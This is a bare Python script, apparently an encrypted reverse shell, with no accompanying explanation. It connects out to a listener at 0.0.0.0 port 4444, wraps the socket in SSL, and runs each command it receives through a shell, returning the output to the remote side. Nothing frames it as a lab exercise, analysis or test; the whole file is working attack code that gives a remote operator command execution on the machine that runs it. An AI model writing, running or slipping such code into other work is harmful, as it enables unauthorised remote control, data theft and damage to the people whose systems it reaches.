import socket as s
import subprocess as r
import ssl
so=s.socket(s.AF_INET,s.SOCK_STREAM)
so.connect(('0.0.0.0',4444))
so=ssl.wrap_socket(so)
while True:
	d=so.recv(1024)
	if len(d)==0:
		break
	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
	o=p.stdout.read()+p.stderr.read()
	so.sendall(o)
